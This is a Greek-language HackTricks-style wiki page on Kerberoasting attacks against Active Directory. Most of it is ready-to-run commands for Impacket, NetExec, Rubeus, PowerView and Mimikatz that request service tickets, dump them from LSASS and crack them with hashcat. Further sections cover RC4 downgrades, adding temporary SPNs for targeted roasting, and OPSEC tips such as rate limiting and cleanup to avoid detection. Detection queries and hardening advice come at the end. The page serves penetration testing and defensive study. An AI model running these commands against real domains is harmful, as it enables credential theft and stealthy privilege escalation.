# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Το Kerberoasting επικεντρώνεται στην απόκτηση TGS tickets, και συγκεκριμένα εκείνων που σχετίζονται με υπηρεσίες οι οποίες εκτελούνται με λογαριασμούς χρηστών στο Active Directory (AD), εξαιρουμένων των λογαριασμών υπολογιστών. Για την κρυπτογράφηση αυτών των tickets χρησιμοποιούνται κλειδιά που προέρχονται από κωδικούς πρόσβασης χρηστών, επιτρέποντας το offline σπάσιμο διαπιστευτηρίων. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσίας υποδεικνύεται από μια μη κενή ιδιότητα ServicePrincipalName (SPN).

Οποιοσδήποτε πιστοποιημένος χρήστης του domain μπορεί να ζητήσει TGS tickets, επομένως δεν απαιτούνται ειδικά προνόμια.<sup>[[4]](#references)[[5]](#references)</sup>

### Βασικά σημεία

- Στοχεύει TGS tickets για υπηρεσίες που εκτελούνται με λογαριασμούς χρηστών (δηλαδή, λογαριασμούς με ορισμένο SPN· όχι λογαριασμούς υπολογιστών).
- Τα tickets κρυπτογραφούνται με κλειδί που προέρχεται από τον κωδικό πρόσβασης του λογαριασμού υπηρεσίας και μπορούν να σπάσουν offline.
- Δεν απαιτούνται αυξημένα προνόμια· οποιοσδήποτε πιστοποιημένος λογαριασμός μπορεί να ζητήσει TGS tickets.

> [!WARNING]
> Τα περισσότερα δημόσια εργαλεία προτιμούν να ζητούν service tickets RC4-HMAC (etype 23), επειδή σπάνε ταχύτερα από τα AES. Τα RC4 TGS hashes αρχίζουν με `$krb5tgs$23$*`, τα AES128 με `$krb5tgs$17$*` και τα AES256 με `$krb5tgs$18$*`. Ωστόσο, πολλά περιβάλλοντα μεταβαίνουν σε αποκλειστική χρήση AES. Μην υποθέτετε ότι αφορά μόνο το RC4.
> Επίσης, αποφύγετε το «spray-and-pray» roasting. Το προεπιλεγμένο kerberoast του Rubeus μπορεί να αναζητήσει και να ζητήσει tickets για όλα τα SPN και είναι θορυβώδες. Κάντε πρώτα απαρίθμηση και στοχεύστε ενδιαφέροντες principals.

### Μυστικά λογαριασμών υπηρεσίας και κόστος κρυπτογράφησης Kerberos

Πολλές υπηρεσίες εξακολουθούν να εκτελούνται με λογαριασμούς χρηστών που έχουν κωδικούς πρόσβασης τους οποίους διαχειρίζονται χειροκίνητα. Το KDC κρυπτογραφεί τα service tickets με κλειδιά που προέρχονται από αυτούς τους κωδικούς πρόσβασης και παραδίδει το ciphertext σε οποιονδήποτε πιστοποιημένο principal, επομένως το kerberoasting παρέχει απεριόριστες offline δοκιμές χωρίς κλειδώματα λογαριασμών ή τηλεμετρία DC. Ο τρόπος κρυπτογράφησης καθορίζει τον προϋπολογισμό για το σπάσιμο:

| Τρόπος | Παραγωγή κλειδιού | Τύπος κρυπτογράφησης | Περίπου απόδοση RTX 5090* | Σημειώσεις |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 με 4,096 επαναλήψεις και salt ανά principal, το οποίο δημιουργείται από το domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 εκατομμύρια δοκιμές/s | Το salt εμποδίζει τη χρήση rainbow tables, αλλά εξακολουθεί να επιτρέπει το γρήγορο σπάσιμο σύντομων κωδικών πρόσβασης. |
| RC4 + NT hash | Ένα MD4 του κωδικού πρόσβασης (NT hash χωρίς salt)· το Kerberos προσθέτει μόνο ένα confounder 8 byte ανά ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **δισεκατομμύρια** δοκιμές/s | ~1000× ταχύτερο από το AES· οι επιτιθέμενοι επιβάλλουν RC4 όποτε το επιτρέπει το `msDS-SupportedEncryptionTypes`. |

*Σημεία αναφοράς από τον Chick3nman, όπως αναφέρονται στην [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Το confounder του RC4 τυχαιοποιεί μόνο το keystream· δεν προσθέτει υπολογιστικό έργο ανά δοκιμή. Εκτός αν οι λογαριασμοί υπηρεσίας χρησιμοποιούν τυχαία μυστικά (gMSA/dMSA, λογαριασμούς υπολογιστών ή συμβολοσειρές που διαχειρίζεται vault), η ταχύτητα παραβίασης εξαρτάται αποκλειστικά από την υπολογιστική ισχύ της GPU. Η επιβολή χρήσης αποκλειστικά AES etypes αφαιρεί την υποβάθμιση σε ένα δισεκατομμύριο δοκιμές ανά δευτερόλεπτο, αλλά οι αδύναμοι ανθρώπινοι κωδικοί πρόσβασης εξακολουθούν να σπάνε μέσω PBKDF2.<sup>[[3]](#references)</sup>

### Επίθεση

#### Linux

Ένα πρακτικό παράδειγμα από άκρο σε άκρο που χρησιμοποιεί το NetExec για να ζητήσει tickets ευάλωτα σε roasting και το Hashcat για να τα σπάσει είναι διαθέσιμο στην αναφορά [1].<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Εργαλεία πολλαπλών λειτουργιών που περιλαμβάνουν ελέγχους kerberoast:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Απαριθμήστε τους kerberoastable users

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Technique 1: Ζητήστε TGS και κάντε dump από τη μνήμη

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Technique 2: Automatic tools

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> Ένα αίτημα TGS δημιουργεί το Windows Security Event 4769 (Ζητήθηκε ένα Kerberos service ticket).

### OPSEC και περιβάλλοντα μόνο με AES

- Ζητήστε σκόπιμα RC4 για λογαριασμούς χωρίς AES:
  - Rubeus: Το `/rc4opsec` χρησιμοποιεί tgtdeleg για να απαριθμήσει λογαριασμούς χωρίς AES και ζητά RC4 service tickets.
  - Rubeus: Το `/tgtdeleg` σε συνδυασμό με το kerberoast προκαλεί επίσης αιτήματα RC4 όπου είναι δυνατό.<sup>[[6]](#references)</sup>
- Κάντε roast σε λογαριασμούς μόνο με AES αντί να αποτυγχάνετε σιωπηρά:
  - Rubeus: Το `/aes` απαριθμεί λογαριασμούς με ενεργοποιημένο AES και ζητά AES service tickets (etype 17/18).
  - Αν έχετε ήδη ένα TGT (PTT ή από ένα .kirbi), μπορείτε να χρησιμοποιήσετε το `/ticket:<blob|path>` μαζί με το `/spn:<SPN>` ή το `/spns:<file>` και να παραλείψετε το LDAP.
- Στόχευση, περιορισμός ρυθμού και λιγότερος θόρυβος:
  - Χρησιμοποιήστε τα `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` και `/jitter:<1-100>`.
  - Φιλτράρετε για πιθανούς αδύναμους κωδικούς πρόσβασης χρησιμοποιώντας το `/pwdsetbefore:<MM-dd-yyyy>` (παλαιότεροι κωδικοί πρόσβασης) ή στοχεύστε προνομιούχα OU με το `/ou:<DN>`.<sup>[[8]](#references)</sup>

Παραδείγματα (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### Persistence / Abuse

Αν ελέγχεις ή μπορείς να τροποποιήσεις έναν λογαριασμό, μπορείς να τον κάνεις kerberoastable προσθέτοντας ένα SPN:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

Κάντε downgrade έναν λογαριασμό για να ενεργοποιήσετε το RC4 και να γίνει ευκολότερο το cracking (απαιτούνται δικαιώματα εγγραφής στο αντικείμενο-στόχο):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### Targeted Kerberoast μέσω GenericWrite/GenericAll σε χρήστη (προσωρινό SPN)

Όταν το BloodHound δείχνει ότι έχετε έλεγχο σε ένα αντικείμενο χρήστη (π.χ. GenericWrite/GenericAll), μπορείτε αξιόπιστα να κάνετε «targeted-roast» τον συγκεκριμένο χρήστη, ακόμη κι αν δεν έχει αυτήν τη στιγμή SPN:<sup>[[9]](#references)</sup>

- Προσθέστε ένα προσωρινό SPN στον χρήστη που ελέγχετε, ώστε να μπορεί να γίνει roast.
- Ζητήστε ένα TGS-REP κρυπτογραφημένο με RC4 (etype 23) για αυτό το SPN, ώστε να διευκολύνετε το cracking.
- Κάντε crack το hash `$krb5tgs$23$...` με το hashcat.
- Αφαιρέστε το SPN για να μειώσετε το footprint.

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Μονογραμμική εντολή Linux (το targetedKerberoast.py αυτοματοποιεί την προσθήκη SPN -> αίτημα TGS (etype 23) -> αφαίρεση SPN):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

Κάντε crack στο output με το autodetect του hashcat (mode 13100 για `$krb5tgs$23$`):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

Σημειώσεις ανίχνευσης: η προσθήκη/αφαίρεση SPNs προκαλεί αλλαγές στον κατάλογο (Event ID 5136/4738 στον χρήστη-στόχο), ενώ το αίτημα TGS δημιουργεί Event ID 4769. Εξετάστε το ενδεχόμενο περιορισμού του ρυθμού και άμεσου καθαρισμού.

Μπορείτε να βρείτε χρήσιμα εργαλεία για επιθέσεις Kerberoast εδώ: https://github.com/nidem/kerberoast

Αν δείτε αυτό το σφάλμα στο Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, οφείλεται σε απόκλιση της τοπικής ώρας. Συγχρονίστε την ώρα με τον DC:

- `ntpdate <DC_IP>` (παρωχημένο σε ορισμένες διανομές)
- `rdate -n <DC_IP>`

### Kerberoast χωρίς λογαριασμό domain (AS-requested STs)

Τον Σεπτέμβριο του 2022, ο Charlie Clark έδειξε ότι αν ένας principal δεν απαιτεί pre-authentication, είναι δυνατό να αποκτηθεί ένα service ticket μέσω ενός κατασκευασμένου KRB_AS_REQ, τροποποιώντας το sname στο σώμα του αιτήματος, ώστε ουσιαστικά να ληφθεί ένα service ticket αντί για ένα TGT. Αυτό είναι ανάλογο με το AS-REP roasting και δεν απαιτεί έγκυρα διαπιστευτήρια domain.

Δείτε λεπτομέρειες στο write-up της Semperis “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Πρέπει να παρέχετε μια λίστα χρηστών, επειδή χωρίς έγκυρα διαπιστευτήρια δεν μπορείτε να κάνετε ερωτήματα LDAP με αυτή την τεχνική.

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

Σχετικά

Αν στοχεύετε χρήστες ευάλωτους σε AS-REP roasting, δείτε επίσης:

{{#ref}}
asreproast.md
{{#endref}}

### Ανίχνευση

Το Kerberoasting μπορεί να γίνει με διακριτικό τρόπο. Αναζητήστε το Event ID 4769 από DCs και εφαρμόστε φίλτρα για να μειώσετε τον θόρυβο:

- Εξαιρέστε το όνομα υπηρεσίας `krbtgt` και ονόματα υπηρεσιών που τελειώνουν σε `$` (λογαριασμοί υπολογιστών).
- Εξαιρέστε αιτήματα από λογαριασμούς μηχανημάτων (`*$$@*`).
- Μόνο επιτυχημένα αιτήματα (Failure Code `0x0`).
- Παρακολουθήστε τους τύπους κρυπτογράφησης: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Μην δημιουργείτε ειδοποιήσεις μόνο για το `0x17`.

Παράδειγμα αρχικής διαλογής με PowerShell:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Πρόσθετες ιδέες:

- Καθορίστε τη συνηθισμένη χρήση SPN ανά host/user ως baseline· ενεργοποιήστε ειδοποίηση για μεγάλες αιχμές αιτημάτων προς διακριτά SPN από έναν principal.
- Επισημάνετε την ασυνήθιστη χρήση RC4 σε domains που έχουν ενισχυθεί με AES.

### Μετριασμός / Hardening

- Χρησιμοποιήστε gMSA/dMSA ή machine accounts για υπηρεσίες. Οι managed accounts έχουν τυχαίους κωδικούς πρόσβασης άνω των 120 χαρακτήρων, οι οποίοι αλλάζουν αυτόματα, καθιστώντας το offline cracking ανέφικτο.<sup>[[7]](#references)</sup>
- Επιβάλετε AES στους service accounts ορίζοντας το `msDS-SupportedEncryptionTypes` σε AES-only (δεκαδικό 24 / δεκαεξαδικό 0x18) και, στη συνέχεια, αλλάξτε τον κωδικό πρόσβασης ώστε να παραχθούν κλειδιά AES.<sup>[[7]](#references)</sup>
- Όπου είναι δυνατό, απενεργοποιήστε το RC4 στο περιβάλλον σας και παρακολουθείτε για απόπειρες χρήσης του. Στους DCs, μπορείτε να χρησιμοποιήσετε την τιμή μητρώου `DefaultDomainSupportedEncTypes` για να ορίσετε τις προεπιλογές για accounts στα οποία δεν έχει οριστεί το `msDS-SupportedEncryptionTypes`. Δοκιμάστε διεξοδικά.
- Αφαιρέστε τα περιττά SPN από user accounts.<sup>[[7]](#references)</sup>
- Αν δεν είναι εφικτή η χρήση managed accounts, χρησιμοποιήστε μεγάλους, τυχαίους κωδικούς πρόσβασης για service accounts (25+ χαρακτήρες)· απαγορεύστε τους κοινούς κωδικούς πρόσβασης και διενεργείτε τακτικά ελέγχους.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking στην πράξη](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Επιθέσεις χαμηλής τεχνικής πολυπλοκότητας και μεγάλου αντίκτυπου από την παλαιού τύπου κρυπτογραφία Kerberos (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Πώς να επιτεθείτε στο Kerberos;](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Κατάχρηση Kerberos στο Active Directory: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Αίτημα για κρυπτογραφημένο με RC4 TGS όταν είναι ενεργοποιημένο το AES](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Ιστολόγιο Microsoft Security (2024-10-11) – Οδηγίες της Microsoft για τον μετριασμό του Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Τεκμηρίωση εντολής kerberoast του Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — διαπιστευτήρια SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync προς DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Νέες διαδρομές επίθεσης; AS Requested Service Tickets (Charlie Clark, Σεπτέμβριος 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
